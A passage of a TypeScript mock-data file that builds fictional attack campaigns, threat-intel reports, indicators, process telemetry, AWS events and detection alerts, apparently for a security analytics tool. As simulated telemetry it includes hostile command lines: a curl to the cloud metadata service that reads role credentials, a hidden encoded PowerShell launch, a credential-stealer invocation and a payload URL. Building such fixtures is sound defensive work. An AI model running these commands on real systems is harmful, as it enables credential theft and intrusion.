/* eslint-disable */
/** Campaign A (EMBERCAST / Cinder Jackal) and Campaign B (SALTWORKS / Hollow Tide): telemetry, TI and storylines. */
import type { StageOut, StorylineOut } from '../../types'
import type { MockGraph } from '../graph'
import { addAlert, ensureTechnique, falconFlat, type AlertSpec } from './alerts'
import { CJ_TECHNIQUES, HT_TECHNIQUES, ID } from './ids'

const P = {
  RUNDLL: 'process:falcon:aid-wks3391:4412:1757408324',
  POWERSHELL: 'process:falcon:aid-wks3391:4380:1757408321',
  SYNCHOST: 'process:falcon:aid-wks3391:5120:1757408470',
  QD: 'process:falcon:aid-wks3391:7731:1757430161',
  SSH_SHELL: 'process:falcon:aid-bas01:21877:1757469917',
  CURL_IMDS: 'process:falcon:aid-bas01:21940:1757470305',
  JAVA: 'process:falcon:aid-edge2a:2211:1757100000',
  BASH_B: 'process:falcon:aid-edge2a:30412:1757538787',
}
const F = {
  MAPLE: `file:sha256:${ID.HASH_MAPLELOADER}`,
  NIGHT: `file:sha256:${ID.HASH_NIGHTFERRY}`,
  QUILL: `file:sha256:${ID.HASH_QUILLDROP}`,
  BRACKISH: `file:sha256:${ID.HASH_BRACKISH}`,
}

export interface CampaignData {
  alerts: AlertSpec[]
  storylines: StorylineOut[]
}

export function buildCampaigns(g: MockGraph): CampaignData {
  buildThreatIntel(g)
  const alertsA = buildCampaignA(g)
  const alertsB = buildCampaignB(g)
  const storylineA = buildStorylineA(g)
  const storylineB = buildStorylineB(g)
  return { alerts: [...alertsA, ...alertsB], storylines: [storylineA, storylineB] }
}

function buildThreatIntel(g: MockGraph) {
  g.node(ID.ACTOR_CJ, 'Cinder Jackal', { aliases: ['EMBER SPIDER', 'TA-9114'], motivation: 'financial', origin: 'Eastern Europe (assessed)', sophistication: 'high', targeted_sectors: ['financial-services', 'payments'], targeted_regions: ['North America', 'Western Europe'], sector_targeting_relevance: 0.9, active: true, description: 'eCrime actor specialising in fintech intrusions that pivot from user workstations through bastion hosts into cloud data stores.' })
  g.node(ID.CAMPAIGN_EMBERCAST, 'EMBERCAST', { actor_id: ID.ACTOR_CJ, status: 'active', started: '2026-07-06T00:00:00Z', objective: 'Cardholder-data theft for resale', targeted_sectors: ['financial-services'], sector_targeting_relevance: 0.9, description: 'ISO/LNK phishing -> MAPLELOADER -> NIGHTFERRY C2 -> QUILLDROP credential theft -> bastion pivot -> IMDS -> cross-account AssumeRole -> S3 collection.' })
  g.edge(ID.CAMPAIGN_EMBERCAST, 'ATTRIBUTED_TO', ID.ACTOR_CJ, { basis: 'report' })
  g.node(ID.MALWARE_MAPLELOADER, 'MAPLELOADER', { family: 'MAPLELOADER', malware_type: 'loader', platforms: ['windows'], description: 'ISO/LNK-delivered DLL loader executed via rundll32.' })
  g.node(ID.MALWARE_QUILLDROP, 'QUILLDROP', { family: 'QUILLDROP', malware_type: 'stealer', platforms: ['windows'], description: 'Credential stealer: LSASS memory, browser stores, SSH keys.' })
  g.node(ID.MALWARE_NIGHTFERRY, 'NIGHTFERRY', { family: 'NIGHTFERRY', malware_type: 'implant', platforms: ['windows'], description: 'HTTPS C2 implant with Run-key persistence.' })
  for (const m of [ID.MALWARE_MAPLELOADER, ID.MALWARE_QUILLDROP, ID.MALWARE_NIGHTFERRY]) {
    g.edge(ID.ACTOR_CJ, 'USES_MALWARE', m)
    g.edge(ID.CAMPAIGN_EMBERCAST, 'USES_MALWARE', m)
  }
  for (const t of CJ_TECHNIQUES) {
    g.edge(ID.ACTOR_CJ, 'USES_TECHNIQUE', ensureTechnique(g, t))
    g.edge(ID.CAMPAIGN_EMBERCAST, 'USES_TECHNIQUE', ensureTechnique(g, t))
  }
  g.node(ID.REPORT_EMBERCAST, 'EMBERCAST: Cinder Jackal shifts to bastion-host pivoting against fintech cloud estates', {
    title: 'EMBERCAST: Cinder Jackal shifts to bastion-host pivoting against fintech cloud estates', published: '2026-09-02T00:00:00Z', publisher: 'Throughline Labs (fictional)', report_confidence: 'high', tlp: 'AMBER',
    summary: 'Cinder Jackal is actively operating EMBERCAST against payment companies: ISO/LNK phishing delivers MAPLELOADER, NIGHTFERRY establishes HTTPS C2, QUILLDROP harvests LSASS memory and SSH keys, and the actor pivots over SSH to cloud bastion hosts where it steals instance-role credentials from IMDS and assumes cross-account data-reader roles.',
    actor_ids: [ID.ACTOR_CJ], campaign_ids: [ID.CAMPAIGN_EMBERCAST], cve_ids: [], technique_ids: CJ_TECHNIQUES, indicator_count: 7, targeted_sectors: ['financial-services'],
    body: 'Since July 2026 Throughline Labs has tracked a marked shift in Cinder Jackal tradecraft. Earlier EMBERCAST intrusions ended at the workstation with stealer output; the current wave deliberately hunts for SSH keys and jump-host configuration files, then pivots to cloud bastions.\n\nOn the bastion the actor queries the instance metadata service for the instance-role credentials and immediately uses them from hosting infrastructure in AS64500 ("Stratovault Hosting", fictional), first with sts:GetCallerIdentity and a handful of denied discovery calls, then with sts:AssumeRole into whichever cross-account role the bastion is trusted for. Collection is fast: bulk s3:GetObject over TLS within an hour of the pivot.\n\nDefenders should treat medium-severity IMDS credential access on any host that carries a cloud instance role as critical, correlate it with subsequent STS activity from unfamiliar ASNs, and review cross-account trust policies that allow bastion roles to assume data-reader roles.',
  })
  g.edge(ID.REPORT_EMBERCAST, 'REPORTS_ON', ID.ACTOR_CJ)
  g.edge(ID.REPORT_EMBERCAST, 'REPORTS_ON', ID.CAMPAIGN_EMBERCAST)
  for (const m of [ID.MALWARE_MAPLELOADER, ID.MALWARE_QUILLDROP, ID.MALWARE_NIGHTFERRY]) g.edge(ID.REPORT_EMBERCAST, 'REPORTS_ON', m)
  const iocs: [string, string, string, number, string, number][] = [
    [ID.IOC_C2_DOMAIN, 'domain', 'cdn-metrics.telemetry-sync.net', 0.95, ID.MALWARE_NIGHTFERRY, 2],
    [ID.IOC_C2_IP, 'ipv4', '203.0.113.42', 0.9, ID.MALWARE_NIGHTFERRY, 2],
    [ID.IOC_EGRESS_IP, 'ipv4', '203.0.113.77', 0.85, ID.CAMPAIGN_EMBERCAST, 5],
    [ID.IOC_HASH_MAPLELOADER, 'sha256', ID.HASH_MAPLELOADER, 0.95, ID.MALWARE_MAPLELOADER, 1],
    [ID.IOC_HASH_QUILLDROP, 'sha256', ID.HASH_QUILLDROP, 0.9, ID.MALWARE_QUILLDROP, 3],
    [ID.IOC_HASH_NIGHTFERRY, 'sha256', ID.HASH_NIGHTFERRY, 0.95, ID.MALWARE_NIGHTFERRY, 2],
    [ID.IOC_FILENAME_SYNCHOST, 'filename', 'synchost.exe', 0.6, ID.MALWARE_NIGHTFERRY, 2],
  ]
  for (const [id, type, value, conf, indicates, stage] of iocs) {
    g.node(id, value, { ioc_type: type, value, confidence: conf, report_id: ID.REPORT_EMBERCAST, actor_id: ID.ACTOR_CJ, campaign_id: ID.CAMPAIGN_EMBERCAST, malware_id: indicates.startsWith('malware') ? indicates : null, kill_chain_stage: stage, active: true, first_seen: '2026-07-14T00:00:00Z', last_seen: '2026-09-09T00:00:00Z' }, { label: 'Indicator' })
    g.edge(id, 'INDICATES', indicates)
    g.edge(id, 'INDICATES', ID.CAMPAIGN_EMBERCAST)
    g.edge(ID.REPORT_EMBERCAST, 'REPORTS_ON', id)
  }

  g.node(ID.ACTOR_HT, 'Hollow Tide', { aliases: ['BRINE GROUP'], motivation: 'access-broker', origin: 'unknown', sophistication: 'medium', targeted_sectors: ['financial-services', 'insurance'], targeted_regions: ['global'], sector_targeting_relevance: 0.8, active: true, description: 'Access broker that mass-exploits internet-facing Java services at financial firms and sells footholds to ransomware affiliates.' })
  g.node(ID.CAMPAIGN_SALTWORKS, 'SALTWORKS', { actor_id: ID.ACTOR_HT, status: 'active', started: '2026-08-20T00:00:00Z', objective: 'Sell footholds in fintech statement/document services', targeted_sectors: ['financial-services'], sector_targeting_relevance: 0.8, description: 'Mass scanning and exploitation of CVE-2021-44228 dropping the BRACKISH webshell.' })
  g.edge(ID.CAMPAIGN_SALTWORKS, 'ATTRIBUTED_TO', ID.ACTOR_HT, { basis: 'report' })
  g.node(ID.MALWARE_BRACKISH, 'BRACKISH', { family: 'BRACKISH', malware_type: 'webshell', platforms: ['linux'], description: 'JSP webshell written into the web root with timestamp blending.' })
  g.edge(ID.ACTOR_HT, 'USES_MALWARE', ID.MALWARE_BRACKISH)
  g.edge(ID.CAMPAIGN_SALTWORKS, 'USES_MALWARE', ID.MALWARE_BRACKISH)
  for (const t of HT_TECHNIQUES) {
    g.edge(ID.ACTOR_HT, 'USES_TECHNIQUE', ensureTechnique(g, t))
    g.edge(ID.CAMPAIGN_SALTWORKS, 'USES_TECHNIQUE', ensureTechnique(g, t))
  }
  g.node(ID.LOG4SHELL, 'CVE-2021-44228', { cve_id: 'CVE-2021-44228', cvss: 10, epss: 0.97, kev: true, severity: 'critical', published: '2021-12-10T00:00:00Z', exploitation_status: 'mass_exploitation', actor_interest: [ID.ACTOR_HT], sector_targeting_relevance: 0.8, ti_report_ids: [ID.REPORT_SALTWORKS], synthetic: false, description: 'Apache Log4j2 JNDI lookup remote code execution (Log4Shell).', affected_component: 'log4j-core' }, { label: 'Vulnerability', severity: 'critical' })
  g.edge(ID.CAMPAIGN_SALTWORKS, 'EXPLOITS', ID.LOG4SHELL, { status: 'mass_exploitation', first_seen: '2026-08-20T00:00:00Z' })
  g.edge(ID.ACTOR_HT, 'EXPLOITS', ID.LOG4SHELL, { status: 'mass_exploitation' })
  g.edge(ID.EDGE_LOG4J_PACKAGE, 'HAS_VULNERABILITY', ID.LOG4SHELL, { fixed_version: '2.17.1' })
  for (const vm of [ID.EDGE_VM, ID.STG_EDGE_VM, ID.DEV_LOG4J_VM]) g.edge(vm, 'VULNERABLE_TO', ID.LOG4SHELL, { via_package: 'log4j-core 2.14.1', exploitable: true })
  g.edge(ID.EDGE_IMAGE, 'VULNERABLE_TO', ID.LOG4SHELL, { via_package: 'log4j-core 2.14.1', exploitable: true })
  g.node(ID.REPORT_SALTWORKS, 'SALTWORKS: Hollow Tide mass-exploits Log4Shell in fintech statement and document services', {
    title: 'SALTWORKS: Hollow Tide mass-exploits Log4Shell in fintech statement and document services', published: '2026-09-08T00:00:00Z', publisher: 'Throughline Labs (fictional)', report_confidence: 'medium', tlp: 'GREEN',
    summary: 'Hollow Tide is scanning financial-services address space for Java statement and document renderers still running vulnerable log4j-core and drops the BRACKISH JSP webshell for later resale.',
    actor_ids: [ID.ACTOR_HT], campaign_ids: [ID.CAMPAIGN_SALTWORKS], cve_ids: ['CVE-2021-44228'], technique_ids: HT_TECHNIQUES, indicator_count: 3, targeted_sectors: ['financial-services'],
    body: 'Beginning 20 August 2026 Hollow Tide infrastructure in 203.0.113.0/24 started high-volume JNDI probing of TCP 8080/8443 services with fintech-specific paths (/statements, /render, /documents). Successful exploitation triggers a one-line shell download from an HTTP payload host on port 8000 and writes a JSP webshell named with a leading dot into the application web root, followed by touch -r to blend timestamps.\n\nWe have observed follow-on access sold within 3-9 days. Buyers typically query the instance metadata service and enumerate S3 buckets reachable from the instance role before deploying ransomware or exfiltrating documents.',
  })
  g.edge(ID.REPORT_SALTWORKS, 'REPORTS_ON', ID.ACTOR_HT)
  g.edge(ID.REPORT_SALTWORKS, 'REPORTS_ON', ID.CAMPAIGN_SALTWORKS)
  g.edge(ID.REPORT_SALTWORKS, 'REPORTS_ON', ID.MALWARE_BRACKISH)
  g.edge(ID.REPORT_SALTWORKS, 'REPORTS_ON', ID.LOG4SHELL)
  const htIocs: [string, string, string, number][] = [
    [ID.IOC_SALTWORKS_IP, 'ipv4', '203.0.113.99', 0.8],
    [ID.IOC_HASH_BRACKISH, 'sha256', ID.HASH_BRACKISH, 0.85],
    [ID.IOC_BRACKISH_URL, 'url', 'http://203.0.113.99:8000/s/brackish.sh', 0.8],
  ]
  for (const [id, type, value, conf] of htIocs) {
    g.node(id, value, { ioc_type: type, value, confidence: conf, report_id: ID.REPORT_SALTWORKS, actor_id: ID.ACTOR_HT, campaign_id: ID.CAMPAIGN_SALTWORKS, malware_id: ID.MALWARE_BRACKISH, kill_chain_stage: 1, active: true, first_seen: '2026-08-20T00:00:00Z', last_seen: '2026-09-10T00:00:00Z' }, { label: 'Indicator' })
    g.edge(id, 'INDICATES', ID.MALWARE_BRACKISH)
    g.edge(id, 'INDICATES', ID.CAMPAIGN_SALTWORKS)
    g.edge(ID.REPORT_SALTWORKS, 'REPORTS_ON', id)
  }
}

function buildCampaignA(g: MockGraph): AlertSpec[] {
  // external infrastructure
  g.node(ID.C2_DOMAIN, 'cdn-metrics.telemetry-sync.net', { fqdn: 'cdn-metrics.telemetry-sync.net', registered_days_ago: 61, reputation: 'malicious' })
  g.node(ID.C2_IP, '203.0.113.42', { address: '203.0.113.42', is_private: false, asn: 'AS64500', asn_org: 'Stratovault Hosting (fictional)', country: 'NL', reputation: 'malicious' })
  g.node(ID.EGRESS_IP, '203.0.113.77', { address: '203.0.113.77', is_private: false, asn: 'AS64500', asn_org: 'Stratovault Hosting (fictional)', country: 'NL', reputation: 'suspicious' })
  g.edge(ID.C2_DOMAIN, 'RESOLVES_TO', ID.C2_IP)
  g.edge(ID.C2_DOMAIN, 'MATCHES_IOC', ID.IOC_C2_DOMAIN, { match_type: 'exact' }, 0.95)
  g.edge(ID.C2_IP, 'MATCHES_IOC', ID.IOC_C2_IP, { match_type: 'exact' }, 0.9)
  g.edge(ID.EGRESS_IP, 'MATCHES_IOC', ID.IOC_EGRESS_IP, { match_type: 'exact' }, 0.85)
  // files and processes
  g.node(F.MAPLE, 'mpl.dll', { sha256: ID.HASH_MAPLELOADER, file_name: 'mpl.dll', file_path: 'C:\\Users\\dwhitfield\\AppData\\Local\\Temp\\mpl.dll', size_bytes: 412160, signed: false, malware_family: 'MAPLELOADER', verdict: 'malicious' })
  g.node(F.NIGHT, 'synchost.exe', { sha256: ID.HASH_NIGHTFERRY, file_name: 'synchost.exe', file_path: 'C:\\ProgramData\\Microsoft\\SyncHost\\synchost.exe', size_bytes: 1893376, signed: false, malware_family: 'NIGHTFERRY', verdict: 'malicious' })
  g.node(F.QUILL, 'qd.exe', { sha256: ID.HASH_QUILLDROP, file_name: 'qd.exe', file_path: 'C:\\Users\\dwhitfield\\AppData\\Local\\Temp\\qd.exe', size_bytes: 778240, signed: false, malware_family: 'QUILLDROP', verdict: 'malicious' })
  g.edge(F.MAPLE, 'MATCHES_IOC', ID.IOC_HASH_MAPLELOADER, { match_type: 'exact' }, 0.95)
  g.edge(F.NIGHT, 'MATCHES_IOC', ID.IOC_HASH_NIGHTFERRY, { match_type: 'exact' }, 0.95)
  g.edge(F.QUILL, 'MATCHES_IOC', ID.IOC_HASH_QUILLDROP, { match_type: 'exact' }, 0.9)
  g.node(P.POWERSHELL, 'powershell.exe', { endpoint_id: ID.WKS_DANA, pid: 4380, image_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', command_line: 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...', user: 'CORP\\dwhitfield', signed: true, signer: 'Microsoft Windows', start_time: '2026-09-09T09:12:01Z', integrity_level: 'medium' })
  g.node(P.RUNDLL, 'rundll32.exe', { endpoint_id: ID.WKS_DANA, pid: 4412, parent_process_id: P.POWERSHELL, image_path: 'C:\\Windows\\System32\\rundll32.exe', command_line: 'rundll32.exe C:\\Users\\dwhitfield\\AppData\\Local\\Temp\\mpl.dll,Start', user: 'CORP\\dwhitfield', sha256: ID.HASH_MAPLELOADER, signed: true, signer: 'Microsoft Windows', start_time: '2026-09-09T09:12:04Z', integrity_level: 'medium' })
  g.node(P.SYNCHOST, 'synchost.exe', { endpoint_id: ID.WKS_DANA, pid: 5120, parent_process_id: P.RUNDLL, image_path: 'C:\\ProgramData\\Microsoft\\SyncHost\\synchost.exe', command_line: 'synchost.exe', user: 'CORP\\dwhitfield', sha256: ID.HASH_NIGHTFERRY, signed: false, start_time: '2026-09-09T09:14:30Z', integrity_level: 'medium' })
  g.node(P.QD, 'qd.exe', { endpoint_id: ID.WKS_DANA, pid: 7731, parent_process_id: P.SYNCHOST, image_path: 'C:\\Users\\dwhitfield\\AppData\\Local\\Temp\\qd.exe', command_line: 'qd.exe --lsass --ssh --browsers', user: 'CORP\\dwhitfield', sha256: ID.HASH_QUILLDROP, signed: false, start_time: '2026-09-09T15:22:41Z', integrity_level: 'high' })
  g.node(P.SSH_SHELL, 'bash', { endpoint_id: ID.EP_BASTION, pid: 21877, image_path: '/usr/bin/bash', command_line: 'bash -i', user: 'svc-finops-sftp', signed: true, start_time: '2026-09-10T02:05:17Z', integrity_level: 'user' })
  g.node(P.CURL_IMDS, 'curl', { endpoint_id: ID.EP_BASTION, pid: 21940, parent_process_id: P.SSH_SHELL, image_path: '/usr/bin/curl', command_line: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/LarkspurBastionSSMRole', user: 'svc-finops-sftp', signed: true, start_time: '2026-09-10T02:11:45Z', integrity_level: 'user' })
  for (const p of [P.POWERSHELL, P.RUNDLL, P.SYNCHOST, P.QD]) g.edge(p, 'RAN_ON', ID.WKS_DANA)
  for (const p of [P.SSH_SHELL, P.CURL_IMDS]) g.edge(p, 'RAN_ON', ID.EP_BASTION)
  g.edge(P.POWERSHELL, 'SPAWNED', P.RUNDLL)
  g.edge(P.RUNDLL, 'SPAWNED', P.SYNCHOST)
  g.edge(P.SYNCHOST, 'SPAWNED', P.QD)
  g.edge(P.SSH_SHELL, 'SPAWNED', P.CURL_IMDS)
  g.edge(P.RUNDLL, 'EXECUTED', F.MAPLE, { action: 'loaded' })
  g.edge(P.RUNDLL, 'EXECUTED', F.NIGHT, { action: 'wrote' })
  g.edge(P.SYNCHOST, 'EXECUTED', F.QUILL, { action: 'wrote' })
  g.edge(P.SYNCHOST, 'CONNECTED_TO', ID.C2_DOMAIN, { port: 443, protocol: 'tcp', direction: 'outbound', count: 199, bytes_out: 2_100_000, first_time: '2026-09-09T09:15:00Z', last_time: '2026-09-10T02:00:00Z' })
  g.edge(P.SYNCHOST, 'CONNECTED_TO', ID.C2_IP, { port: 443, protocol: 'tcp', direction: 'outbound', count: 199 })
  g.edge(P.RUNDLL, 'RAN_AS', ID.USER_DANA)
  g.edge(P.SSH_SHELL, 'RAN_AS', ID.SVC_FINOPS_SFTP)
  // credentials
  g.node(ID.CRED_SSH_KEY, 'dwhitfield id_ed25519', { credential_type: 'ssh_private_key', principal_id: ID.SVC_FINOPS_SFTP, status: 'valid', issued_at: '2025-03-11T00:00:00Z' })
  g.node(ID.CRED_BASTION_KEY, 'ASIA5LARKBASTION01Q7', { credential_type: 'aws_temporary_key', principal_id: ID.BASTION_ROLE, issued_at: '2026-09-10T02:11:45Z', expires_at: '2026-09-10T08:11:45Z', status: 'expired', access_key_id: 'ASIA5LARKBASTION01Q7' })
  g.node(ID.CRED_PROD_KEY, 'ASIA5LARKPRODREADER1', { credential_type: 'aws_temporary_key', principal_id: ID.PROD_READER_ROLE, issued_at: '2026-09-10T02:24:15Z', expires_at: '2026-09-10T03:24:15Z', status: 'expired', derived_from: ID.CRED_BASTION_KEY, session_name: 'ember-sync', access_key_id: 'ASIA5LARKPRODREADER1' })
  g.edge(ID.CRED_SSH_KEY, 'CREDENTIAL_FOR', ID.SVC_FINOPS_SFTP)
  g.edge(ID.CRED_BASTION_KEY, 'CREDENTIAL_FOR', ID.BASTION_ROLE)
  g.edge(ID.CRED_PROD_KEY, 'CREDENTIAL_FOR', ID.PROD_READER_ROLE)
  g.edge(ID.CRED_PROD_KEY, 'DERIVED_FROM', ID.CRED_BASTION_KEY, { via: 'assume_role' })
  g.edge(P.QD, 'ACCESSED_CREDENTIAL', ID.CRED_SSH_KEY, { method: 'file_read' })
  g.edge(P.CURL_IMDS, 'ACCESSED_CREDENTIAL', ID.CRED_BASTION_KEY, { method: 'imds' })
  g.edge(ID.WKS_DANA, 'LATERAL_MOVEMENT_TO', ID.EP_BASTION, { protocol: 'ssh', account: 'svc-finops-sftp', time: '2026-09-10T02:05:17Z', alert_id: ID.A007 }, 0.95)
  // incidents
  g.node(ID.INCIDENT_WKS, 'inc-0091', { vendor_severity: 'high', status: 'new', start_time: '2026-09-09T09:12:04Z', end_time: '2026-09-09T16:10:00Z', alert_count: 6, hosts: ['WKS-3391'], description: 'Falcon incident on WKS-3391 (ldt-a001..a006)' }, { label: 'Incident', severity: 'high' })
  g.node(ID.INCIDENT_BASTION, 'inc-0094', { vendor_severity: 'medium', status: 'new', start_time: '2026-09-10T02:05:17Z', end_time: '2026-09-10T02:11:45Z', alert_count: 3, hosts: ['bas-01'], description: 'Falcon incident on bas-01 (ldt-a007, a008x, a009)' }, { label: 'Incident', severity: 'medium' })
  // cloud events
  const events: [string, string, string, string, string, boolean, string | null, number, string, string][] = [
    ['a010', '2026-09-10T02:20:31Z', 'GetCallerIdentity', 'sts.amazonaws.com', ID.CRED_BASTION_KEY, true, null, 1, ID.BASTION_ROLE, ID.ACC_SHARED],
    ['a011', '2026-09-10T02:21:02Z', 'ListAllMyBuckets', 's3.amazonaws.com', ID.CRED_BASTION_KEY, false, 'AccessDenied', 2, ID.BASTION_ROLE, ID.ACC_SHARED],
    ['a012', '2026-09-10T02:24:15Z', 'AssumeRole', 'sts.amazonaws.com', ID.CRED_BASTION_KEY, true, null, 1, ID.BASTION_ROLE, ID.PROD_READER_ROLE],
    ['a013', '2026-09-10T02:26:00Z', 'ListBucket', 's3.amazonaws.com', ID.CRED_PROD_KEY, true, null, 1, ID.PROD_READER_ROLE, ID.CARDHOLDER_VAULT],
    ['a014', '2026-09-10T02:27:10Z', 'GetObject', 's3.amazonaws.com', ID.CRED_PROD_KEY, true, null, 1247, ID.PROD_READER_ROLE, ID.CARDHOLDER_VAULT],
    ['a015', '2026-09-10T03:41:12Z', 'GetSecretValue', 'secretsmanager.amazonaws.com', ID.CRED_PROD_KEY, true, null, 1, ID.PROD_READER_ROLE, ID.DB_READER_SECRET],
    ['a016', '2026-09-10T03:41:40Z', 'GetSecretValue', 'secretsmanager.amazonaws.com', ID.CRED_PROD_KEY, true, null, 1, ID.PROD_READER_ROLE, ID.HSM_SECRET],
  ]
  for (const [n, time, name, source, cred, ok, err, count, principal, target] of events) {
    const id = ID.EVT(n)
    const credNode = g.must(cred)
    g.node(id, `${name}${count > 1 ? ` x${count}` : ''}`, {
      provider: 'aws', account_id: principal === ID.PROD_READER_ROLE ? '111111111111' : '222222222222', event_name: name, event_source: source, event_time: time, principal_id: principal,
      principal_arn: String(g.must(principal).props.arn ?? ''), access_key_id: String(credNode.props.access_key_id), source_ip: '203.0.113.77', user_agent: 'aws-cli/2.17.0 Python/3.11.9 Linux/6.8',
      success: ok, error_code: err, target_id: target, count, bytes: name === 'GetObject' ? 38_400_000_000 : 0, anomalous: true,
      anomaly_reasons: ['instance-role credentials used outside AWS network', 'new ASN AS64500 for this principal'],
    }, { label: 'CloudEvent', severity: ok ? 'medium' : 'low' })
    g.edge(id, 'USED_CREDENTIAL', cred)
    g.edge(id, 'PERFORMED_BY', principal)
    g.edge(id, 'FROM_IP', ID.EGRESS_IP)
    g.edge(id, 'MATCHES_IOC', ID.IOC_EGRESS_IP, { match_type: 'exact' }, 0.85)
    if (name === 'AssumeRole') g.edge(id, 'ASSUMED', target)
    else g.edge(id, 'TARGETED', target)
  }

  const S = ID.STORYLINE_A
  const actor = [ID.ACTOR_CJ]
  const alerts: AlertSpec[] = [
    {
      id: ID.A001, title: 'Malicious file execution via LNK in mounted ISO', description: 'explorer.exe mounted Invoice_Q3_Remittance.iso; Remittance_Viewer.lnk launched hidden PowerShell which ran rundll32 on mpl.dll (MAPLELOADER).',
      source: 'falcon', type: 'detection', severity: 'high', detected_at: '2026-09-09T09:12:04Z', entity_id: ID.WKS_DANA, hostname: 'WKS-3391', user: 'CORP\\dwhitfield', techniques: ['T1566.001', 'T1204.002', 'T1059.001', 'T1218.011'], tactic: 'Initial Access',
      storyline_id: S, score: 88, reasons: ['on attack path', 'IOC match (MAPLELOADER)', 'active TI: Cinder Jackal', 'entry point of storyline'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 1, ti_actor_ids: actor, incident: ID.INCIDENT_WKS,
      involves: [[P.RUNDLL, 'subject'], [F.MAPLE, 'object'], [ID.USER_DANA, 'subject']],
      flat: falconFlat({ host: 'WKS-3391', sev: 'High', tactic: 'Initial Access', technique: 'User Execution: Malicious File (T1204.002)', user: 'CORP\\dwhitfield', file: 'rundll32.exe', cmdline: 'rundll32.exe C:\\Users\\dwhitfield\\AppData\\Local\\Temp\\mpl.dll,Start', parent: 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...', sha: ID.HASH_MAPLELOADER, ip: '10.40.12.77', platform: 'Windows', ts: '2026-09-09T09:12:04Z', incident: 'inc-0091', objective: 'Gain Access', disposition: 'Process blocked (partial)', extra: { ioa_name: 'LNK launched from ISO mount', mounted_image: 'Invoice_Q3_Remittance.iso' } }),
    },
    {
      id: ID.A002, title: 'Run-key persistence by recently written binary', description: 'mpl.dll wrote C:\\ProgramData\\Microsoft\\SyncHost\\synchost.exe, created HKCU\\...\\Run\\SyncHost and injected into explorer.exe.',
      source: 'falcon', type: 'detection', severity: 'medium', detected_at: '2026-09-09T09:14:30Z', entity_id: ID.WKS_DANA, hostname: 'WKS-3391', user: 'CORP\\dwhitfield', techniques: ['T1547.001', 'T1055'], tactic: 'Persistence',
      storyline_id: S, score: 79, reasons: ['on attack path', 'IOC match (NIGHTFERRY)', 'active TI: Cinder Jackal'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 1, ti_actor_ids: actor, incident: ID.INCIDENT_WKS,
      involves: [[P.RUNDLL, 'subject'], [F.NIGHT, 'object']],
      flat: falconFlat({ host: 'WKS-3391', sev: 'Medium', tactic: 'Persistence', technique: 'Registry Run Keys / Startup Folder (T1547.001)', user: 'CORP\\dwhitfield', file: 'synchost.exe', cmdline: 'synchost.exe', parent: 'rundll32.exe C:\\Users\\dwhitfield\\AppData\\Local\\Temp\\mpl.dll,Start', sha: ID.HASH_NIGHTFERRY, ip: '10.40.12.77', platform: 'Windows', ts: '2026-09-09T09:14:30Z', incident: 'inc-0091', extra: { registry_key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SyncHost' } }),
    },
    {
      id: ID.A003, title: 'Periodic outbound connections to rare domain', description: 'synchost.exe beaconed every 300 s over HTTPS to cdn-metrics.telemetry-sync.net (203.0.113.42:443).',
      source: 'falcon', type: 'detection', severity: 'medium', detected_at: '2026-09-09T11:40:00Z', entity_id: ID.WKS_DANA, hostname: 'WKS-3391', user: 'CORP\\dwhitfield', techniques: ['T1071.001', 'T1573.002'], tactic: 'Command and Control',
      storyline_id: S, score: 81, reasons: ['on attack path', 'C2 domain matches Cinder Jackal IOC', 'active TI'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 2, ti_actor_ids: actor, incident: ID.INCIDENT_WKS,
      involves: [[P.SYNCHOST, 'subject'], [ID.C2_DOMAIN, 'destination'], [ID.C2_IP, 'destination']],
      flat: falconFlat({ host: 'WKS-3391', sev: 'Medium', tactic: 'Command and Control', technique: 'Application Layer Protocol: Web Protocols (T1071.001)', user: 'CORP\\dwhitfield', file: 'synchost.exe', cmdline: 'synchost.exe', sha: ID.HASH_NIGHTFERRY, ip: '10.40.12.77', platform: 'Windows', ts: '2026-09-09T11:40:00Z', incident: 'inc-0091', extra: { remote_domain: 'cdn-metrics.telemetry-sync.net', remote_ip: '203.0.113.42', remote_port: 443, connection_count: 29, interval_seconds: 300 } }),
    },
    {
      id: ID.A004, title: 'Credential dumping technique observed (LSASS memory read)', description: 'qd.exe (QUILLDROP) opened lsass.exe with PROCESS_VM_READ and dumped memory.',
      source: 'falcon', type: 'detection', severity: 'medium', detected_at: '2026-09-09T15:22:41Z', entity_id: ID.WKS_DANA, hostname: 'WKS-3391', user: 'CORP\\dwhitfield', techniques: ['T1003.001'], tactic: 'Credential Access',
      storyline_id: S, score: 83, reasons: ['on attack path', 'IOC match (QUILLDROP)', 'active TI: Cinder Jackal'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 1, ti_actor_ids: actor, incident: ID.INCIDENT_WKS,
      involves: [[P.QD, 'subject'], [F.QUILL, 'object']],
      flat: falconFlat({ host: 'WKS-3391', sev: 'Medium', tactic: 'Credential Access', technique: 'OS Credential Dumping: LSASS Memory (T1003.001)', user: 'CORP\\dwhitfield', file: 'qd.exe', cmdline: 'qd.exe --lsass --ssh --browsers', parent: 'synchost.exe', sha: ID.HASH_QUILLDROP, ip: '10.40.12.77', platform: 'Windows', ts: '2026-09-09T15:22:41Z', incident: 'inc-0091', extra: { target_process: 'lsass.exe', access_mask: 'PROCESS_VM_READ' } }),
    },
    {
      id: ID.A005, title: 'Access to SSH private key by unsigned process', description: 'qd.exe read C:\\Users\\dwhitfield\\.ssh\\id_ed25519 and FinOpsSync\\config.ini (host=bas-01.shared.larkspur.internal user=svc-finops-sftp).',
      source: 'falcon', type: 'detection', severity: 'low', detected_at: '2026-09-09T15:31:10Z', entity_id: ID.WKS_DANA, hostname: 'WKS-3391', user: 'CORP\\dwhitfield', techniques: ['T1552.001'], tactic: 'Credential Access',
      storyline_id: S, score: 77, reasons: ['on attack path', 'stolen key authenticates to bastion', 'active TI'], reaches_crown_jewel: true, on_attack_path: true, ioc_match_count: 0, ti_actor_ids: actor, incident: ID.INCIDENT_WKS,
      involves: [[P.QD, 'subject'], [ID.CRED_SSH_KEY, 'credential']],
